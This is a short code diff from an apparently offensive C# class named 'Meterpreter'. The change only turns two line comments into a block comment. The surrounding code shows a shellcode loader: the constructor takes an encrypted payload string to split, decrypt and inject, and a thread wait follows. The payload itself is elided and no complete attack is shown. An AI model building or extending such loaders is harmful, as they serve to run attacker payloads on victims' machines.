@@ -42,8 +42,8 @@ public class Meterpreter
         WaitForSingleObject(hThread, 0xFFFFFFFF);
     }
 
-    // Payload_Encrypted = "37,***,1";
-    // Decrypt and Inject Shellcode Decrypted
+    /*Payload_Encrypted = "37,***,1";
+     Decrypt and Inject Shellcode Decrypted */
     public Meterpreter(string Payload_Encrypted)
     {
         string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
